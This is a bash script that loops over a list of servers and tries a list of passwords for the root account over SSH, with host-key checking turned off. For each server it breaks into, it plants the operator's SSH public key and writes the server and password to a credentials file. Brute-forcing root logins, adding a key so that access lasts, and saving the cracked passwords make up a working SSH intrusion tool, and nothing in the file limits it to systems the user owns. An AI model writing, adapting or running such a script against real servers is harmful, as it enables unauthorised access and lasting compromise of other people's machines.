#!/bin/bash

# --- Setting ---
# username to connect server
USERNAME="root"

# Input and Output files
SERVER_LIST="servers.txt"
PASSWORD_LIST="passwords.txt"
OUTPUT_FILE="credentials.txt"

# --- Checking ---
# check to be sshpass tool
if ! command -v sshpass &> /dev/null
then
    echo "error: not sshpass "
    echo "install sshpass"
    exit 1
fi

# Checking Servers list file
if [ ! -f "$SERVER_LIST" ]; then
    echo "error: '$SERVER_LIST' is not existed."
    exit 1
fi

# Checking Passwords list file
if [ ! -f "$PASSWORD_LIST" ]; then
    echo "error: '$PASSWORD_LIST' is not existed."
    exit 1
fi

# --- Starting Process ---
# Create output file or empty it first.
> "$OUTPUT_FILE"

echo "Starting Servers process..."
echo "------------------------------------"

# Reading each server from file.
while IFS= read -r server || [[ -n "$server" ]]; do
    echo "[*] Trying to Connect : $server"
    
    found_password=false

    # Reading each password from file.
    while IFS= read -r password || [[ -n "$password" ]]; do
        
        # Attempting to run a simple command (echo) on the remote server to test the connection
        # -o StrictHostKeyChecking=no: To avoid questions about new host keys
        # -o ConnectTimeout=5: To avoid long delays if the server does not respond
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "${USERNAME}@${server}" 'echo "connected"' > /dev/null 2>&1
        
        # Check the output code of the previous command. If it is 0, the connection was successful.
        if [ $? -eq 0 ]; then
            echo "  [+] Password was SUCCESS for $server ."
            found_password=true
            
            # Now that we have the password, let's copy the SSH public key.
            echo "  [*] Copying public SSH key to $server..."
            sshpass -p "$password" ssh-copy-id -o StrictHostKeyChecking=no "${USERNAME}@${server}" > /dev/null 2>&1
            
            if [ $? -eq 0 ]; then
                echo "    [+] SSH key copy was SUCCESS to $server ."
            else
                echo "    [-] error: SSH key failed to copy on $server."
            fi

            # Save the correct IP and password in the output file.
            echo "${server}:${password}" >> "$OUTPUT_FILE"
            
            # Breaking the inner loop because the password for this server has been found.
            break
        fi
    done < "$PASSWORD_LIST"

    if [ "$found_password" = false ]; then
        echo "  [-] Password for $server not found in list."
    fi

    echo "------------------------------------"

done < "$SERVER_LIST"

echo "Process Done."
echo "Information about servers that were successfully connected is stored in file: '$OUTPUT_FILE' ."
